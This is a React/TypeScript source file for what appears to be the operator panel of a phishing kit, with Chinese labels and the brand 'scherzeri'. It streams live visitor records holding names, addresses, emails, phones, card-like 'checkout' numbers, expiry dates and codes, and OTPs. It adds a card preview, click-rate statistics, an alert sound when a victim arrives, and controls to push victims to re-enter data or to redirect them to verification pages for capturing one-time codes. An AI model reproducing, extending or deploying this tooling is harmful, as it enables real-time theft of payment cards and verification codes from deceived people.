
import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { socket } from './socket';
import { useAdminConnection, readAdminPasswordFromSession } from './hooks/useAdminConnection';
import { AdminLogin } from './ui/AdminLogin';
import { AdminHeaderBar } from './ui/AdminHeaderBar';
import { AdminToolbarPanel } from './ui/AdminToolbarPanel';
import { AdminRecordsTable } from './ui/AdminRecordsTable';
import { CardPreviewModal } from './ui/CardPreviewModal';
import type { AdminUpdatePayload, RouteTarget } from './types';

type CheckoutSnapshot = {
  at?: number;
  time?: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutCode?: string;
  checkoutDate?: string;
};

type RecordRow = {
  id: number | string;
  socketId: string;
  ip: string;
  deviceType?: string;
  deviceOS?: string;
  time: string;
  page?: string;
  online?: boolean;
  status?: string;
  fullname?: string;
  address?: string;
  fulladdress?: string;
  city?: string;
  state?: string;
  postalcode?: string;
  email?: string;
  telephone?: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutCode?: string;
  checkoutDate?: string;
  checkoutExpiryDate?: string;
  checkoutSnapshots?: CheckoutSnapshot[];
  verifyMethod?: string;
  verify?: string;
  emailVerify?: string;
  appCheck?: string;
  updatedAt?: number;
  active?: boolean;
};

type OnlineUser = {
  page: string;
  ip: string;
  online: boolean;
  activeRecordId?: string | number | null;
};

type FilterKey = 'needs_action' | 'in_progress' | 'submitted' | 'offline' | 'refills' | 'all';
type SortKey = 'id_desc' | 'recent_activity';

type FlatRow = { r: RecordRow; indent: boolean; mainId: number; subsCount: number };

type Group = { mainId: number; main?: RecordRow; subs: RecordRow[] };
type CardPreviewData = {
  id: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutExpiryDate?: string;
  checkoutCode?: string;
};

function safeText(v: unknown) {
  return (v ?? '').toString();
}

function isSubId(id: RecordRow['id']) {
  return id.toString().includes('.');
}

function mainIdOf(id: RecordRow['id']) {
  return parseInt(id.toString().split('.')[0], 10);
}

function compareRecordIdDesc(a: RecordRow['id'], b: RecordRow['id']) {
  const pa = a
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));
  const pb = b
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));

  if ((pb[0] ?? 0) !== (pa[0] ?? 0)) return (pb[0] ?? 0) - (pa[0] ?? 0);
  return (pb[1] ?? -1) - (pa[1] ?? -1);
}

function fmtAgo(ms: number) {
  if (ms < 1000) return '刚刚';
  const s = Math.floor(ms / 1000);
  if (s < 60) return `${s}秒前`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}分钟前`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}小时前`;
  return `${Math.floor(h / 24)}天前`;
}

function pageName(page?: string) {
  const p = (page || '').toLowerCase();
  if (p.includes('home')) return '首页';
  if (p.includes('info')) return '资料页';
  if (p.includes('emailverify')) return '邮箱验证页';
  if (p.includes('appcheck')) return '应用验证页';
  if (p.includes('verify')) return '验证页';
  if (p.includes('checkout')) return '结账页';
  return page || '未知';
}

function statusCategory(status?: string) {
  const s = (status || '').toLowerCase();
  if (!s) return 'unknown';
  if (s.includes('submitted') || s.includes('已提交')) return 'submitted';
  if (s.includes('refill') || s.includes('重填')) return 'refill';
  if (s.includes('editing') || s.includes('typing') || s.includes('filling') || s.includes('entered')) return 'progress';
  return 'other';
}

const FIELD_MAP: Array<{ keys: string[]; label: string }> = [
  { keys: ['fullname', 'full name', 'name'], label: '姓名' },
  { keys: ['address line 1', 'address1', 'address'], label: '地址' },
  { keys: ['address line 2', 'address2', 'fulladdress'], label: '完整地址' },
  { keys: ['city'], label: '城市' },
  { keys: ['state', 'province'], label: '州/省' },
  { keys: ['postal', 'zip', 'postalcode'], label: '邮编' },
  { keys: ['email'], label: '邮箱' },
  { keys: ['phone', 'telephone'], label: '电话' },
  { keys: ['checkout name'], label: '结账姓名' },
  { keys: ['checkout phone'], label: '结账号码' },
  { keys: ['checkout code', 'verification code', 'otp'], label: '结账验证码' },
  { keys: ['checkout date'], label: '结账日期' },
  { keys: ['verify method', 'verifymethod'], label: '验证方式' },
  { keys: ['verify'], label: '验证页' },
  { keys: ['emailverify'], label: '邮箱验证页' },
  { keys: ['appcheck'], label: '应用验证页' },
];

function detectFieldLabel(text: string) {
  const t = (text || '').toLowerCase();
  for (const item of FIELD_MAP) {
    if (item.keys.some((k) => t.includes(k))) return item.label;
  }
  return null;
}

function toZhStatus(status?: string, page?: string) {
  const raw = (status || '').trim();
  const lower = raw.toLowerCase();

  if (!raw) return `停留在 ${pageName(page)}`;
  if (lower.includes('entered home')) return '用户点击进入';
  if (lower.includes('checkout submitted')) return '结账已提交';
  if (lower.includes('verify submitted')) return '验证码已提交';
  if (lower.includes('submitted')) return '已提交';
  if (lower.includes('checkout refill requested')) return '等待重填结账';
  if (lower.includes('refill requested')) return '等待重填资料';
  if (lower.includes('selected verify method:')) {
    const method = raw.split(':').slice(1).join(':').trim().toLowerCase();
    if (method === 'phone') return '已选择验证方式：手机';
    if (method === 'email') return '已选择验证方式：邮箱';
    return `已选择验证方式：${method || '-'}`;
  }

  const editing =
    raw.match(/^(editing|typing|input|filling)\s*[:：]\s*(.+)$/i)?.[2]?.trim() ||
    raw.match(/^正在填写\s*[:：]\s*(.+)$/)?.[1]?.trim() ||
    '';
  if (editing) return `正在填写 ${detectFieldLabel(editing) || editing}`;

  const entered = raw.match(/^entered\s+(.+)$/i)?.[1]?.trim();
  if (entered) return `进入 ${pageName(entered)}`;

  if (lower.includes('admin routed user')) {
    const target = raw.split('->').pop()?.trim();
    return target ? `管理员跳转到 ${pageName(target)}` : '管理员发起跳转';
  }

  if (lower.includes('editing') || lower.includes('typing') || lower.includes('filling')) {
    const f = detectFieldLabel(raw);
    return f ? `正在填写 ${f}` : `正在填写 ${pageName(page)}`;
  }

  return raw;
}

function escapeCsvCell(s: string) {
  const t = s ?? '';
  if (/[",\n\r]/.test(t)) return `"${t.replace(/"/g, '""')}"`;
  return t;
}

function toCsv(records: RecordRow[]) {
  const headers = [
    'id',
    'socketId',
    'ip',
    'time',
    'page',
    'online',
    'status',
    'fullname',
    'address',
    'fulladdress',
    'city',
    'state',
    'postalcode',
    'email',
    'telephone',
    'checkoutName',
    'checkoutPhone',
    'checkoutCode',
    'checkoutDate',
    'checkoutExpiryDate',
    'verifyMethod',
    'verify',
    'emailVerify',
    'appCheck',
    'updatedAt',
    'active',
  ];

  const lines = [
    headers.join(','),
    ...records.map((r) =>
      headers
        .map((h) => {
          const v = (r as any)[h];
          return escapeCsvCell(v === undefined || v === null ? '' : typeof v === 'object' ? JSON.stringify(v) : String(v));
        })
        .join(',')
    ),
  ];
  return lines.join('\n');
}

function downloadBlob(filename: string, content: BlobPart, mime: string) {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
export default function AdminDashboard() {
  const [records, setRecords] = useState<RecordRow[]>([]);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [adminPassword, setAdminPassword] = useState(() => readAdminPasswordFromSession());

  const [q, setQ] = useState('');
  const [filter, setFilter] = useState<FilterKey>('all');
  const [onlyMain, setOnlyMain] = useState(false);
  const [onlyOnline, setOnlyOnline] = useState(false);
  const [onlyCurrent, setOnlyCurrent] = useState(false);
  const [sortBy, setSortBy] = useState<SortKey>('id_desc');
  const [pageSize, setPageSize] = useState(50);
  const [page, setPage] = useState(1);
  const [expandAll, setExpandAll] = useState(true);
  const [collapsedMain, setCollapsedMain] = useState<Record<string, boolean>>({});
  const [showHistory, setShowHistory] = useState<Record<string, boolean>>({});

  const [pendingRecords, setPendingRecords] = useState<RecordRow[] | null>(null);
  const [pendingOnlineUsers, setPendingOnlineUsers] = useState<OnlineUser[] | null>(null);
  const [pendingCount, setPendingCount] = useState(0);
  const [clickRateLabel, setClickRateLabel] = useState('0% (0/0)');
  const [viewLocked, setViewLocked] = useState(false);
  const [cardPreview, setCardPreview] = useState<CardPreviewData | null>(null);

  const recordsLenRef = useRef(0);
  const viewLockedRef = useRef(false);
  const enterNoticeBootstrappedRef = useRef(false);
  const enterNotifiedIdsRef = useRef<Set<string>>(new Set());

  const [nowTick, setNowTick] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setNowTick((x) => x + 1), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    recordsLenRef.current = records.length;
  }, [records.length]);

  useEffect(() => {
    viewLockedRef.current = viewLocked;
  }, [viewLocked]);

  useEffect(() => {
    const onScroll = () => {
      const locked = window.scrollY > 8;
      setViewLocked((prev) => (prev === locked ? prev : locked));
    };
    onScroll();
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  const sortRecords = useCallback((list: RecordRow[]) => [...list].sort((a, b) => compareRecordIdDesc(a.id, b.id)), []);

  const applyWithScrollLock = useCallback(
    (nextRecords: RecordRow[] | null, nextOnline: OnlineUser[] | null) => {
      const y = window.scrollY;
      if (nextRecords) setRecords(sortRecords(nextRecords));
      if (nextOnline) setOnlineUsers(nextOnline);
      setPendingRecords(null);
      setPendingOnlineUsers(null);
      setPendingCount(0);
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          window.scrollTo({ top: y });
        });
      });
    },
    [sortRecords]
  );

  const handleAdminUpdate = useCallback(
    (data: AdminUpdatePayload) => {
      const nextRecords: RecordRow[] | null = Array.isArray(data.records) ? sortRecords(data.records as RecordRow[]) : null;
      const nextOnline: OnlineUser[] | null = Array.isArray(data.onlineUsers) ? (data.onlineUsers as OnlineUser[]) : null;
      const stepDone = Number(data.stats?.stepDone || 0);
      const stepTotal = Number(data.stats?.stepTotal || 0);
      const clickRate = Number(data.stats?.clickRate || 0);
      setClickRateLabel(`${clickRate.toFixed(1)}% (${stepDone}/${stepTotal})`);

      if (viewLockedRef.current) {
        if (nextRecords) {
          setPendingRecords(nextRecords);
          setPendingCount((prev) => {
            const add = Math.max(0, nextRecords.length - recordsLenRef.current);
            return Math.max(prev, add);
          });
        }
        if (nextOnline) setPendingOnlineUsers(nextOnline);
        return;
      }

      applyWithScrollLock(nextRecords, nextOnline);
    },
    [applyWithScrollLock, sortRecords]
  );

  const {
    adminAuthed,
    authLoading,
    authError,
    connectionState,
    lastDisconnectReason,
    lastDisconnectAt,
    lastConnectError,
    reconnectCount,
    requestAdminAuth,
  } = useAdminConnection({
    adminPassword,
    onAdminUpdate: handleAdminUpdate,
    onAuthFailed: () => {
      setRecords([]);
      setOnlineUsers([]);
      setPendingRecords(null);
      setPendingOnlineUsers(null);
      setPendingCount(0);
      setClickRateLabel('0% (0/0)');
    },
  });

  useEffect(() => {
    if (!viewLocked && (pendingRecords || pendingOnlineUsers)) {
      applyWithScrollLock(pendingRecords, pendingOnlineUsers);
    }
  }, [viewLocked, pendingRecords, pendingOnlineUsers, applyWithScrollLock]);

  const copyText = async (text: string) => {
    try {
      await navigator.clipboard?.writeText(text);
    } catch {
      // ignore
    }
  };

  const pushBrowserNotice = useCallback((title: string, body: string) => {
    if (typeof window === 'undefined' || !('Notification' in window)) return;

    const show = () => {
      try {
        new Notification(title, { body, tag: `admin-enter-${Date.now()}` });
      } catch {
        // ignore notification failures
      }
    };

    if (Notification.permission === 'granted') {
      show();
      return;
    }

    if (Notification.permission === 'default') {
      Notification.requestPermission()
        .then((permission) => {
          if (permission === 'granted') show();
        })
        .catch(() => {
          // ignore
        });
    }
  }, []);

  const playEnterSound = useCallback(() => {
    if (typeof window === 'undefined') return;
    try {
      const AudioCtx = window.AudioContext || (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
      if (!AudioCtx) return;
      const ctx = new AudioCtx();
      if (ctx.state === 'suspended') {
        void ctx.resume().catch(() => {
          // ignore
        });
      }

      const playTone = (startAt: number, freq: number, duration: number, gainValue: number) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, ctx.currentTime + startAt);
        gain.gain.setValueAtTime(0.0001, ctx.currentTime + startAt);
        gain.gain.exponentialRampToValueAtTime(gainValue, ctx.currentTime + startAt + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + startAt + duration);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(ctx.currentTime + startAt);
        osc.stop(ctx.currentTime + startAt + duration + 0.02);
      };

      // double-beep for "user entered" event
      playTone(0, 880, 0.1, 0.045);
      playTone(0.16, 1175, 0.12, 0.04);

      window.setTimeout(() => {
        void ctx.close().catch(() => {
          // ignore
        });
      }, 500);
    } catch {
      // ignore audio failures
    }
  }, []);

  useEffect(() => {
    const isEnterStatus = (status?: string) => safeText(status).toLowerCase().includes('entered home');

    if (!enterNoticeBootstrappedRef.current) {
      for (const r of records) {
        if (isEnterStatus(r.status)) enterNotifiedIdsRef.current.add(r.id.toString());
      }
      enterNoticeBootstrappedRef.current = true;
      return;
    }

    for (const r of records) {
      if (!isEnterStatus(r.status)) continue;
      const key = r.id.toString();
      if (enterNotifiedIdsRef.current.has(key)) continue;
      enterNotifiedIdsRef.current.add(key);
      playEnterSound();
      pushBrowserNotice('用户点击进入', `序号 ${key} · IP ${safeText(r.ip) || '-'}`);
    }

    if (enterNotifiedIdsRef.current.size > 5000) {
      const latest = new Set<string>(records.slice(0, 2000).map((x) => x.id.toString()));
      enterNotifiedIdsRef.current = latest;
    }
  }, [records, pushBrowserNotice, playEnterSound]);

  const openCardPreview = (r: RecordRow) => {
    setCardPreview({
      id: r.id.toString(),
      checkoutName: r.checkoutName,
      checkoutPhone: r.checkoutPhone,
      checkoutExpiryDate: r.checkoutExpiryDate,
      checkoutCode: r.checkoutCode,
    });
  };

  const grouped = useMemo(() => {
    const map = new Map<number, Group>();
    for (const r of records) {
      const mid = mainIdOf(r.id);
      if (!map.has(mid)) map.set(mid, { mainId: mid, subs: [] });
      const g = map.get(mid)!;
      if (isSubId(r.id)) g.subs.push(r);
      else g.main = r;
    }
    for (const g of map.values()) g.subs.sort((a, b) => compareRecordIdDesc(a.id, b.id));
    return [...map.values()].sort((a, b) => {
      if (sortBy === 'recent_activity') {
        const aLast = Math.max(a.main?.updatedAt || 0, ...a.subs.map((x) => x.updatedAt || 0));
        const bLast = Math.max(b.main?.updatedAt || 0, ...b.subs.map((x) => x.updatedAt || 0));
        if (bLast !== aLast) return bLast - aLast;
      }
      return b.mainId - a.mainId;
    });
  }, [records, sortBy]);

  const groupRecordMap = useMemo(() => {
    const m = new Map<number, RecordRow[]>();
    for (const g of grouped) {
      const list = [g.main, ...g.subs].filter(Boolean) as RecordRow[];
      list.sort((a, b) => compareRecordIdDesc(a.id, b.id));
      m.set(g.mainId, list);
    }
    return m;
  }, [grouped]);

  const getHistoryRows = useCallback(
    (mainId: number, excludeId: RecordRow['id']) => {
      const rows = groupRecordMap.get(mainId) || [];
      return rows.filter((x) => x.id.toString() !== excludeId.toString()).slice(0, 3);
    },
    [groupRecordMap]
  );

  const quickFilter = useCallback(
    (main: RecordRow, subs: RecordRow[]) => {
      const cat = statusCategory(main.status);
      const isOffline = main.online === false;
      const hasCurrent = !!main.active || subs.some((s) => !!s.active);

      if (onlyOnline && isOffline) return false;
      if (onlyCurrent && !hasCurrent) return false;

      const idleMs = Date.now() - (main.updatedAt || Date.now());
      const inProgress = !isOffline && (cat === 'progress' || (idleMs < 30_000 && cat !== 'submitted'));
      const needsAction =
        cat === 'refill' || (!isOffline && idleMs > 180_000 && cat !== 'submitted') || (isOffline && cat !== 'submitted');

      switch (filter) {
        case 'needs_action':
          return needsAction;
        case 'in_progress':
          return inProgress;
        case 'submitted':
          return cat === 'submitted';
        case 'offline':
          return isOffline;
        case 'refills':
          return subs.length > 0;
        default:
          return true;
      }
    },
    [filter, onlyOnline, onlyCurrent, nowTick]
  );

  const hit = useCallback((r: RecordRow, keyword: string) => {
    if (!keyword) return true;
    const hay = [
      r.id,
      r.time,
      r.ip,
      r.fullname,
      r.address,
      r.fulladdress,
      r.city,
      r.state,
      r.postalcode,
      r.email,
      r.telephone,
      r.status,
      r.page,
      r.checkoutName,
      r.checkoutPhone,
      r.checkoutCode,
      r.checkoutDate,
      r.checkoutExpiryDate,
      r.verifyMethod,
      r.verify,
      r.emailVerify,
      r.appCheck,
    ]
      .filter(Boolean)
      .join(' ')
      .toLowerCase();
    return hay.includes(keyword);
  }, []);

  const rows = useMemo(() => {
    const keyword = q.trim().toLowerCase();
    const out: FlatRow[] = [];

    for (const g of grouped) {
      const main = g.main;
      if (!main) continue;
      const subs = g.subs || [];
      if (!quickFilter(main, subs)) continue;

      const subMatches = subs.filter((s) => hit(s, keyword));
      const mainMatches = hit(main, keyword);
      if (!(mainMatches || subMatches.length)) continue;

      out.push({ r: main, indent: false, mainId: g.mainId, subsCount: subs.length });
      if (onlyMain) continue;

      const collapsed = collapsedMain[g.mainId.toString()] ?? !expandAll;
      if (!collapsed) {
        for (const s of subMatches) out.push({ r: s, indent: true, mainId: g.mainId, subsCount: subs.length });
      }
    }

    return out;
  }, [grouped, q, onlyMain, collapsedMain, expandAll, quickFilter, hit, nowTick]);

  useEffect(() => {
    setPage(1);
  }, [q, filter, onlyMain, onlyOnline, onlyCurrent, sortBy, pageSize]);

  const totalRows = rows.length;
  const totalPages = Math.max(1, Math.ceil(totalRows / pageSize));
  const safePage = Math.min(page, totalPages);
  const pageStart = (safePage - 1) * pageSize;
  const pagedRows = useMemo(() => rows.slice(pageStart, pageStart + pageSize), [rows, pageStart, pageSize]);

  useEffect(() => {
    if (page !== safePage) setPage(safePage);
  }, [page, safePage]);

  const toggleCollapse = (mainId: number) => {
    setCollapsedMain((prev) => ({ ...prev, [mainId.toString()]: !(prev[mainId.toString()] ?? !expandAll) }));
  };

  const toggleHistory = (id: RecordRow['id']) => {
    const k = id.toString();
    setShowHistory((prev) => ({ ...prev, [k]: !prev[k] }));
  };

  const onlineCount = onlineUsers.filter((u) => u.online).length;

  const handleClear = () => {
    if (window.confirm('确定清空所有记录？此操作不可恢复。')) {
      socket.emit('admin-clear-all', {}, (resp) => {
        if (!resp?.ok) alert(`清空失败：${resp?.error || 'unknown error'}`);
      });
    }
  };

  const handleDownloadCsv = () => {
    const ts = new Date().toISOString().replace(/[:.]/g, '-');
    downloadBlob(`records-${ts}.csv`, toCsv(records), 'text/csv;charset=utf-8');
  };

  const handleRefill = (socketId: string) => {
    if (!socketId) return;
    if (window.confirm('确定重填资料？会创建子序号。')) socket.emit('request-refill', { socketId, reason: '' });
  };

  const handleCheckoutRefill = (socketId: string, recordId: RecordRow['id']) => {
    if (!socketId) return;
    if (window.confirm('确定重填结账？会在当前序号下重填，不会新增序号。')) {
      socket.emit('request-checkout-refill', { socketId, recordId });
    }
  };

  const routeUserTo = (socketId: string, target: RouteTarget) => {
    if (!socketId) {
      alert('缺少 socketId，无法跳转。');
      return;
    }
    socket.emit('admin-route-user', { socketId, target }, (resp: any) => {
      if (!resp?.ok) alert(`跳转失败：${resp?.error || 'unknown error'}`);
    });
  };

  const routeByFrontendJs = (socketId: string) => {
    if (!socketId) {
      alert('缺少 socketId，无法跳转。');
      return;
    }
    socket.emit('admin-route-url', { socketId }, (resp: any) => {
      if (!resp?.ok) alert(`跳转失败：${resp?.error || 'unknown error'}`);
    });
  };

  const badgeForActivity = (r: RecordRow) => {
    if (r.online === false) return { label: '离线', cls: 'bg-red-500/10 text-red-300 border-red-500/20' };
    const ms = Date.now() - (r.updatedAt || Date.now());
    if (ms < 20_000) return { label: `活跃 · ${fmtAgo(ms)}`, cls: 'bg-green-500/10 text-green-300 border-green-500/20' };
    if (ms < 120_000) return { label: `空闲 · ${fmtAgo(ms)}`, cls: 'bg-yellow-500/10 text-yellow-200 border-yellow-500/20' };
    return { label: `卡住 · ${fmtAgo(ms)}`, cls: 'bg-orange-500/10 text-orange-200 border-orange-500/20' };
  };

  const filterCounts = useMemo(() => {
    let needs_action = 0;
    let in_progress = 0;
    let submitted = 0;
    let offline = 0;
    let refills = 0;
    let all = 0;

    for (const g of grouped) {
      if (!g.main) continue;
      all += 1;
      const cat = statusCategory(g.main.status);
      const isOffline = g.main.online === false;
      const idleMs = Date.now() - (g.main.updatedAt || Date.now());
      const inProgress = !isOffline && (cat === 'progress' || (idleMs < 30_000 && cat !== 'submitted'));
      const needsAction =
        cat === 'refill' || (!isOffline && idleMs > 180_000 && cat !== 'submitted') || (isOffline && cat !== 'submitted');
      if (needsAction) needs_action += 1;
      if (inProgress) in_progress += 1;
      if (cat === 'submitted') submitted += 1;
      if (isOffline) offline += 1;
      if (g.subs.length > 0) refills += 1;
    }

    return { needs_action, in_progress, submitted, offline, refills, all };
  }, [grouped, nowTick]);

  if (!adminAuthed) {
    return (
      <AdminLogin
        brandName="scherzeri"
        adminPassword={adminPassword}
        authLoading={authLoading}
        authError={authError}
        connectionState={connectionState}
        lastDisconnectAt={lastDisconnectAt}
        lastDisconnectReason={lastDisconnectReason}
        lastConnectError={lastConnectError}
        reconnectCount={reconnectCount}
        onPasswordChange={setAdminPassword}
        onSubmit={() => requestAdminAuth(adminPassword)}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[radial-gradient(circle_at_top,#1a2332_0%,#0d1117_45%,#0d1117_100%)] text-[#c9d1d9] p-3 sm:p-4 md:p-6 font-sans">
      <AdminHeaderBar
        title="scherzeri"
        onlineCount={onlineCount}
        clickRateLabel={clickRateLabel}
        onClear={handleClear}
        onDownloadCsv={handleDownloadCsv}
      />

      <AdminToolbarPanel
        onlyMain={onlyMain}
        onOnlyMainChange={setOnlyMain}
        onlyOnline={onlyOnline}
        onOnlyOnlineChange={setOnlyOnline}
        onlyCurrent={onlyCurrent}
        onOnlyCurrentChange={setOnlyCurrent}
        sortBy={sortBy}
        onSortByChange={setSortBy}
        pageSize={pageSize}
        onPageSizeChange={setPageSize}
        onExpandAll={() => {
          setExpandAll(true);
          setCollapsedMain({});
        }}
        onCollapseAll={() => {
          setExpandAll(false);
          setCollapsedMain({});
        }}
        filter={filter}
        onFilterChange={setFilter}
        filterCounts={filterCounts}
        hasPending={!!(pendingRecords || pendingOnlineUsers)}
        pendingCount={pendingCount}
        applyPending={() => applyWithScrollLock(pendingRecords, pendingOnlineUsers)}
      />

      <AdminRecordsTable
        rows={pagedRows}
        totalRows={totalRows}
        pageStart={pageStart}
        expandAll={expandAll}
        collapsedMain={collapsedMain}
        showHistory={showHistory}
        onToggleCollapse={toggleCollapse}
        onToggleHistory={toggleHistory}
        onCopyText={copyText}
        onOpenCardPreview={openCardPreview}
        onRefill={handleRefill}
        onCheckoutRefill={handleCheckoutRefill}
        onRouteUser={routeUserTo}
        onRouteByFrontendJs={routeByFrontendJs}
        badgeForActivity={badgeForActivity}
        getHistoryRows={getHistoryRows}
        formatStatus={toZhStatus}
      />

      <div className="mt-3 text-xs text-[#8b949e] flex items-center justify-between">
        {(() => {
          const filterLabelMap: Record<FilterKey, string> = {
            needs_action: '需处理',
            in_progress: '填写中',
            submitted: '已提交',
            offline: '离线',
            refills: '有重填',
            all: '全部',
          };
          return (
            <span>
              当前行数：{totalRows} · 页码：<span className="font-mono">{safePage}</span>/<span className="font-mono">{totalPages}</span> · 当前筛选：
              <span className="font-mono">{filterLabelMap[filter]}</span>
            </span>
          );
        })()}
        <span>多用户模式</span>
      </div>

      {cardPreview && <CardPreviewModal data={cardPreview} onClose={() => setCardPreview(null)} />}
    </div>
  );
}
